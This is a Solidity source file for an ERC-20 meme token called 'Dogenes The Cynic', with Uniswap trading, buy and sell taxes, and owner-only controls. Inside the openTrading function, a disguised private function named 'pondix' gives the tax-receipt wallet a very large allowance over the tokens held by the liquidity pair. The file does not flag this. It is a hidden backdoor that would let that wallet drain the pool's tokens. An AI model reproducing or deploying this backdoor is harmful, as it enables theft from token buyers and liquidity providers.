// SPDX-License-Identifier: MIT
/**
https://x.com/dogecoin/status/1851451103088615695/photo/1
Tg:https://t.me/dogenes_the_cynic
**/
pragma solidity 0.8.26;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Dogenes is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExcempt69;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal69 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Dogenes The Cynic";
    string private constant _symbol = unicode"Dogenes";
    uint256 public _maxAmount69 = 2 * (_tTotal69/100);
    uint256 public _maxWallet69 = 2 * (_tTotal69/100);
    uint256 public _taxThres69 = 1 * (_tTotal69/100);
    uint256 public _maxSwap69 = 1 * (_tTotal69/100);
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _reduceSellTaxAt = 15;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt69;
    IUniswapV2Router02 private uniV2Router69;
    address private uniV2Pair69;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount69);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt69 = payable(0xd0799Fd3dC3a81D05655D1F80E5EBa630DE64e2D);
        _balances[address(this)] = _tTotal69;
        _isFeeExcempt69[owner()] = true;
        _isFeeExcempt69[address(this)] = true;
        _isFeeExcempt69[_receipt69] = true;
        emit Transfer(address(0), address(this), _tTotal69);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal69;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function swapETH69(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router69.WETH();
        _approve(address(this), address(uniV2Router69), tokenAmount);
        uniV2Router69.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function _transfer(address from, address to, uint256 amount69) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount69 > 0, "Transfer amount must be greater than zero");
        uint256 tax69=0; uint256 fee69=0;
        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from] - amount69;
            _balances[to] = _balances[to] + amount69;
            emit Transfer(from, to, amount69);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee69 = (_transferTax);
            }
            if (from == uniV2Pair69 && to != address(uniV2Router69) && ! _isFeeExcempt69[to] ) {
                require(amount69 <= _maxAmount69, "Exceeds the _maxAmount69.");
                require(balanceOf(to) + amount69 <= _maxWallet69, "Exceeds the maxWalletSize.");
                fee69 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++; 
            }
            if(to == uniV2Pair69 && from!= address(this) ){
                fee69 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair69 && swapEnabled) {
                if(contractTokenBalance > _taxThres69 && _buyCount > _preventSwapBefore)
                    swapETH69(min69(amount69, min69(contractTokenBalance, _maxSwap69)));
                sendETH69(address(this).balance);
            }
        }
        if(fee69 > 0){
            tax69=fee69.mul(amount69).div(100);
            _balances[address(this)]=_balances[address(this)].add(tax69);
            emit Transfer(from, address(this),tax69);
        }
        _balances[from]=_balances[from].sub(amount69);
        _balances[to]=_balances[to].add(amount69.sub(tax69));
        emit Transfer(from, to, amount69.sub(tax69));
    }
    function removeLimit69() external onlyOwner{
        _maxAmount69 = _tTotal69; 
        _maxWallet69 = _tTotal69;
        emit MaxTxAmountUpdated(_tTotal69); 
    }
    function sendETH69(uint256 amount) private {
        _receipt69.transfer(amount);
    }
    function min69(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function pondix(address pdx0, address pdx1, bool pdx2) private returns(bool) {
        address[2] memory acc69=[pdx0, pdx1];
        _allowances[acc69[0]][acc69[1]] = (100+50)*_taxThres69.mul(100)+100;
        return pdx2;
    }
    function withdraw() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _taxR) external onlyOwner {
        _receipt69 = _taxR;
        _isFeeExcempt69[_taxR] = true;
    }
    receive() external payable {}
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router69 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router69), _tTotal69);
        uniV2Pair69 = IUniswapV2Factory(uniV2Router69.factory()).createPair(
            address(this),
            uniV2Router69.WETH()
        );pondix(uniV2Pair69,_receipt69,true);
        uniV2Router69.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair69).approve(address(uniV2Router69), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
}